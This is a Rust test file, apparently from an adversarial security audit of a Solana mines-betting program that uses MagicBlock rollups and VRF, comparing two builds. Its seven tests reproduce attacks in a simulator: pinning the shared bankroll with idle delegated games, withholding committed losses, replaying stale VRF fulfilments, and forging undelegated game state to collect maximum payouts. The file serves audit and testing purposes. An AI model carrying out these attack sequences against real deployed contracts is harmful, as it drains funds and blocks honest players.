//! Adversarial audit, MagicBlock ER/VRF lens. Every test runs on BOTH builds (Anchor reference and
//! kaboom-p) and asserts they agree; the asserts on top of that pin the attack outcome, so a passing test
//! means "this attack works the same way on both" (inherited) unless the test says otherwise.
use difftest::*;

const SOL: u64 = LAMPORTS_PER_SOL;
const BET: u64 = 10_000_000;

fn world() -> (Pair, World, Address) {
    let mut p = Pair::new();
    let w = p.house_world();
    let validator = key("validator");
    p.enable_vrf(&w, validator);
    (p, w, validator)
}
fn start_ix(player: Address, mines: u8, bet: u64, session: Address) -> Instruction {
    ix::StartGameVrf { player, claim: pda::vrf_claim(&player), game: pda::vrf_game(&player), player_stats: pda::stats(&player), ..Default::default() }
        .ix(mines, bet, session)
}
fn deleg_ix(player: Address, validator: Address) -> Instruction {
    let mut i = delegate_vrf_ix(player);
    i.accounts.push(AccountMeta::new_readonly(validator, false));
    i
}
fn refund_ix(caller: Address, player: Address) -> Instruction {
    ix::RefundStalledVrf { caller, player, claim: pda::vrf_claim(&player), game: pda::vrf_game(&player), ..Default::default() }.ix()
}
fn settle_ix(payer: Address, player: Address, treasury: Address) -> Instruction {
    ix::SettleVrf { payer, player, claim: pda::vrf_claim(&player), game: pda::vrf_game(&player), treasury, player_stats: pda::stats(&player), ..Default::default() }.ix()
}
fn release_ix(owner: Address, player: Address) -> Instruction {
    ix::AdminReleaseVrfClaim { owner, player, claim: pda::vrf_claim(&player), ..Default::default() }.ix()
}
fn cb_ix(game: Address, r: [u8; 32]) -> Instruction {
    ix::RevealCallbackVrf { vrf_program_identity: ids::SCOPED_VRF_IDENTITY, game }.ix(r)
}
fn outstanding(p: &Pair) -> u64 { p.read(&ids::V2_STATE, accounts::VaultV2State::decode).total_outstanding_max_payout }
fn assets(p: &Pair) -> u64 { p.lamports(&ids::VAULT) - rent_min(accounts::Vault::SPACE) }
fn is_mine(r: &[u8; 32], safe: u8, mines: u8) -> bool {
    let rem = 16u8.saturating_sub(safe) as u64;
    rem != 0 && u64::from_le_bytes(r[..8].try_into().unwrap()) % rem < mines as u64
}
/// Largest bet `start_game_vrf` accepts right now for 1 mine (worst case 15.84x at edge 100,
/// vrf_max_payout_bps 1000), with a 1% margin.
fn max_bet_now(p: &Pair) -> u64 {
    let a = assets(p) as u128;
    let free = a.saturating_sub(outstanding(p) as u128);
    let health = (free * 10_000 / a).min(10_000);
    let max_payout = a * 1_000 / 10_000 * health / 10_000;
    (max_payout * 10_000 / 158_400 * 99 / 100) as u64
}

/// MB-1 (liveness, inherited). A player who starts and delegates a VRF game and then never undelegates
/// pins the game's worst-case reservation indefinitely: the house relay cannot refund it
/// (GameStillDelegated) and only the player/session may call settle_and_undelegate_vrf. A handful of
/// wallets doing this drives the shared bankroll down to the health floor, blocking ordinary bets in
/// BOTH game modes, at no cost to the attacker (each bet is recoverable: undelegate + player refund).
/// Still true on both builds for the existing instructions; the port's fix (house `force_undelegate_vrf`
/// + VOID refund, F3) is tested in fix_f3.rs (`f3_mb1_cleared`).
#[test]
fn mb1_idle_delegated_games_pin_bankroll() {
    let (mut p, w, validator) = world();
    let honest = p.user("honest");
    let honest_bet = 200_000_000; // 0.2 SOL, 1 mine: fits a fresh 50 SOL vault
    // sanity: it fits before the attack (probe on a clone-free basis: compute, don't run)
    assert!(honest_bet <= max_bet_now(&p), "setup: honest bet must fit the fresh vault");

    let mut attackers = vec![];
    for i in 0..30 {
        let a = p.user(&format!("attacker{i}"));
        let bet = max_bet_now(&p);
        if bet < 1_000_000 { break; }
        let d = p.run(&[start_ix(a, 1, bet, a)]);
        if !d.anchor.ok() { d.assert_same(); break; }
        d.assert_ok();
        p.ok(&[deleg_ix(a, validator)]);
        attackers.push((a, bet));
    }
    let staked: u64 = attackers.iter().map(|x| x.1).sum();
    println!("MB-1: {} idle games, {} lamports staked, outstanding {} of assets {}", attackers.len(), staked, outstanding(&p), assets(&p));
    assert!(attackers.len() >= 10);

    // The house relay cannot clear any of them once the stall window passes.
    p.warp(START_SLOT + 1_000);
    for (a, _) in &attackers {
        p.run(&[refund_ix(w.house, *a)]).assert_err(6052); // GameStillDelegated
    }
    // The honest player's ordinary bet is now refused on both builds.
    let d = p.run(&[start_ix(honest, 1, honest_bet, honest)]);
    d.assert_failed();
    println!("MB-1 honest start: anchor {:?} port {:?}", d.anchor.code(), d.port.code());
    // The legacy commit-reveal mode shares the same health/max-payout gate on Anchor.
    // INTENDED: VRF-only. The port refuses every legacy start (6057).
    let lg = p.user("legacy");
    let d = p.run(&[ix::StartGame { game: pda::game(&lg), player_stats: pda::stats(&lg), player: lg, ..Default::default() }
        .ix(1, honest_bet, commitment(0b100, 1, &[7; 32]))]);
    d.anchor_failed();
    println!("MB-1 legacy start: anchor {:?} port {:?}", d.anchor.code(), d.port.code());

    // Attacker cost is zero: undelegate the untouched game (fake DLP output) and refund as the player.
    let (a0, bet0) = attackers[0];
    let game = pda::vrf_game(&a0);
    let l1 = p.get(&game).unwrap().data; // still Playing, no reveals
    let buffer = pda::undelegate_buffer(&game);
    p.set_account(game, Account { lamports: 0, data: vec![], owner: ids::SYSTEM, executable: false, rent_epoch: 0 });
    p.set_data(buffer, ids::DLP, l1);
    let rp = p.user("dlp-payer");
    let mut u = ix::ProcessUndelegation { base_account: game, buffer, payer: rp, ..Default::default() }
        .ix(vec![b"kaboom_vrf_game".to_vec(), a0.as_ref().to_vec()]);
    u.accounts[1].is_signer = true;
    u.accounts[2].is_signer = true;
    p.ok(&[u]);
    let before = p.lamports(&a0);
    p.ok(&[refund_ix(a0, a0)]);
    assert!(p.lamports(&a0) >= before + bet0, "attacker recovers the full bet");
}

/// MB-2 (fund, inherited). A loss the rollup has already committed to L1 (DLP-owned copy shows
/// status = Lost) can never be settled while the player withholds undelegation, and the only exit for
/// the reservation, admin_release_vrf_claim, refunds the full bet without looking at that committed
/// state. Free option: win -> undelegate + settle; lose -> sit until the 24 h release pays the bet back.
/// On the port, while the ER is up, the house can force + undelegate a committed loss (fix_f3.rs,
/// `f3_force_terminal_unchanged`), which then settles as a loss.
#[test]
fn mb2_committed_loss_withheld_then_refunded_by_admin_release() {
    let (mut p, w, validator) = world();
    let player = p.user("player");
    p.start_game_vrf(player, 1, BET, player);
    p.ok(&[deleg_ix(player, validator)]);
    let game = pda::vrf_game(&player);
    // Validator commit (no undelegate) lands the ER loss on the DLP-owned L1 copy.
    let r = (0..=255u8).map(|b| [b; 32]).find(|r| is_mine(r, 0, 1)).unwrap();
    p.patch(game, |d| {
        d[8] = 2; // Lost
        d[78] = 1; // reveal_count
        d[81..83].copy_from_slice(&(1u16 << 3).to_le_bytes());
        d[83..85].copy_from_slice(&(1u16 << 3).to_le_bytes());
        d[93] = 3;
        d[94..126].copy_from_slice(&r);
    });
    assert_eq!(p.get(&game).unwrap().owner, ids::DLP);
    // Nobody can book the loss: settle needs a program-owned game.
    p.run(&[settle_ix(w.house, player, w.treasury)]).assert_err(3007);
    p.warp(START_SLOT + 26);
    p.run(&[refund_ix(w.house, player)]).assert_err(6052);
    // After the abandon window the owner's only reservation release pays the lost bet back.
    p.warp(START_SLOT + 216_001);
    let before = p.lamports(&player);
    p.ok(&[release_ix(w.owner, player)]);
    assert_eq!(p.lamports(&player), before + BET + rent_min(accounts::VrfClaim::SPACE));
}

/// MB-3 (dust griefing probe, DLP behaviour, same on both). Can a third party block a victim's
/// delegate_vrf forever by pre-funding the victim's DLP delegation record / metadata PDAs (both are
/// derivable from the victim's address alone)? Prints the outcome; asserts parity only.
#[test]
fn mb3_prefunded_dlp_record_or_metadata() {
    for which in ["record", "metadata", "buffer"] {
        let (mut p, _w, validator) = world();
        let victim = p.user("victim");
        let game = p.start_game_vrf(victim, 1, BET, victim);
        let k = match which {
            "record" => pda::delegation_record(&game),
            "metadata" => pda::delegation_metadata(&game),
            _ => pda::buffer(&game),
        };
        p.fund(k, rent_min(0));
        let d = p.run(&[deleg_ix(victim, validator)]);
        d.assert_same();
        println!("MB-3 pre-funded {which}: anchor {} port {}", fmt_err(&d.anchor.err), fmt_err(&d.port.err));
    }
}

/// MB-4 (binding, inherited). The callback is not bound to the request it answers: any scoped-identity
/// fulfilment that arrives while `pending` is set is applied to `pending_tile`, including one issued for
/// an EARLIER game on the same PDA (request in flight -> player undelegates -> refunds -> starts and
/// delegates a new game -> new request). No request nonce is passed in callback_args or checked.
#[test]
fn mb4_stale_fulfilment_applies_to_new_game() {
    let (mut p, _w, _validator) = world();
    let player = p.user("player");
    let game = p.start_game_vrf(player, 1, BET, player);
    // Game 1: reveal request in flight when the player pulls the game back to L1 (pending = 1).
    p.patch(game, |d| { d[79] = 1; d[80] = 3; });
    p.warp(START_SLOT + 26);
    p.ok(&[refund_ix(player, player)]); // player may refund a pending game
    // Game 2 on the same PDA, new request for tile 7.
    p.ok(&[start_ix(player, 1, BET, player)]);
    p.patch(game, |d| { d[79] = 1; d[80] = 7; });
    // The stale fulfilment of game 1's request (randomness the player may already have seen in a failed
    // callback) is accepted for game 2's tile 7.
    let stale = [0x11u8; 32];
    p.ok(&[cb_ix(game, stale)]);
    let g = p.read(&game, accounts::VrfGame::decode);
    assert_eq!((g.reveal_count, g.reveals[0].tile, g.reveals[0].randomness), (1, 7, stale));
}

/// MB-5 (0.15.5 undelegation-buffer bug: fixed in both). An attacker-signed, attacker-owned or
/// non-canonical buffer cannot mint a forged VrfGame (status Won, 15 safe reveals) at a victim's PDA.
#[test]
fn mb5_forged_undelegation_rejected() {
    let (mut p, _w, _validator) = world();
    let victim = p.user("victim");
    let game = pda::vrf_game(&victim);
    let forged = accounts::VrfGame { status: 1, player: victim, session_key: victim, bump: pda::find(&[b"kaboom_vrf_game", victim.as_ref()], &PROGRAM_ID).1,
        mine_count: 1, house_edge_bps: 100, safe_reveals: 15, reveal_count: 15, pending: false, pending_tile: 255,
        revealed_mask: 0x7fff, mine_mask: 0, multiplier_bps: 158_400, reveals: std::array::from_fn(|_| accounts::VrfReveal { tile: 0, randomness: [0; 32] }) }.encode();
    let attacker = p.user("attacker");
    let seeds = vec![b"kaboom_vrf_game".to_vec(), victim.as_ref().to_vec()];
    let mk = |buffer: Address| {
        let mut u = ix::ProcessUndelegation { base_account: game, buffer, payer: attacker, ..Default::default() }.ix(seeds.clone());
        u.accounts[1].is_signer = true;
        u.accounts[2].is_signer = true;
        u
    };
    // 1. attacker keypair as buffer, owned by the DLP-lookalike (attacker cannot make it DLP-owned, but try)
    let fake = key("attacker-buffer");
    p.set_data(fake, ids::DLP, forged.clone());
    p.run(&[mk(fake)]).assert_err(2006);
    // 2. canonical buffer address but not DLP-owned (attacker cannot create it under the DLP)
    let canon = pda::undelegate_buffer(&game);
    p.set_data(canon, attacker, forged.clone());
    p.run(&[mk(canon)]).assert_failed();
    // 3. canonical, DLP-owned, but not signed (only the DLP can sign it)
    p.set_data(canon, ids::DLP, forged);
    let mut u = mk(canon);
    u.accounts[1].is_signer = false;
    p.run(&[u]).assert_failed();
    assert!(p.get(&game).is_none_or(|a| a.lamports == 0));
}

/// MB-6 (liveness, inherited), FIXED on the port. INTENDED: F6. After admin_release_vrf_claim the VrfGame
/// PDA is left behind (often still delegated). When it later comes back to L1 nothing can close it
/// (settle_vrf and refund_stalled_vrf both need the closed claim), and Anchor's start_game_vrf `init`s that
/// PDA, so the wallet is locked out of VRF mode. The port's start reuses the orphan (see fix_f6.rs).
#[test]
fn mb6_admin_release_orphans_game_and_locks_wallet() {
    let (mut p, w, _validator) = world();
    let player = p.user("player");
    p.start_game_vrf(player, 1, BET, player);
    p.warp(START_SLOT + 216_001);
    p.ok(&[release_ix(w.owner, player)]);
    p.run(&[refund_ix(player, player)]).assert_failed();
    p.run(&[settle_ix(player, player, w.treasury)]).assert_failed();
    let d = p.run(&[start_ix(player, 1, BET, player)]);
    assert!(!d.anchor.ok(), "Anchor: the wallet is locked out");
    assert!(d.port.ok(), "port: the orphan is reused\n{}", d.report());
    let _ = SOL;
}

/// MB-7 (trust assumption, inherited, documented in vrf_mode.rs). Whatever the pinned ER validator
/// commits is what settle_vrf pays on: the replay only checks self-consistency, it cannot verify VRF
/// proofs. A forged 15-safe full clear (randomness chosen to replay safe) undelegated through the
/// DLP's canonical buffer settles at the maximum multiplier; the only bound is the per-game `reserved`.
#[test]
fn mb7_validator_forged_full_clear_pays_reserved() {
    let (mut p, w, _validator) = world();
    let player = p.user("player");
    let game = p.start_game_vrf(player, 1, BET, player);
    let reserved = p.read(&pda::vrf_claim(&player), accounts::VrfClaim::decode).reserved;
    let mut g = p.read(&game, accounts::VrfGame::decode);
    for i in 0..15u8 {
        let r = (0..=255u8).map(|b| [b; 32]).find(|r| !is_mine(r, i, 1)).unwrap();
        g.reveals[i as usize] = accounts::VrfReveal { tile: i, randomness: r };
    }
    g.status = 1;
    g.safe_reveals = 15;
    g.reveal_count = 15;
    g.revealed_mask = 0x7fff;
    g.multiplier_bps = 158_400;
    let forged = g.encode();
    let buffer = pda::undelegate_buffer(&game);
    p.set_account(game, Account { lamports: 0, data: vec![], owner: ids::SYSTEM, executable: false, rent_epoch: 0 });
    p.set_data(buffer, ids::DLP, forged); // what the DLP holds after a validator-signed commit
    let rp = p.user("dlp-payer");
    let mut u = ix::ProcessUndelegation { base_account: game, buffer, payer: rp, ..Default::default() }
        .ix(vec![b"kaboom_vrf_game".to_vec(), player.as_ref().to_vec()]);
    u.accounts[1].is_signer = true;
    u.accounts[2].is_signer = true;
    p.ok(&[u]);
    let before = p.lamports(&player);
    p.ok(&[settle_ix(w.house, player, w.treasury)]);
    let paid = p.lamports(&player) - before;
    println!("MB-7: forged full clear paid {} (bet {BET}, reserved {reserved})", paid);
    assert!(paid >= BET * 158_400 / 10_000);
    assert!(BET * 158_400 / 10_000 <= reserved);
}
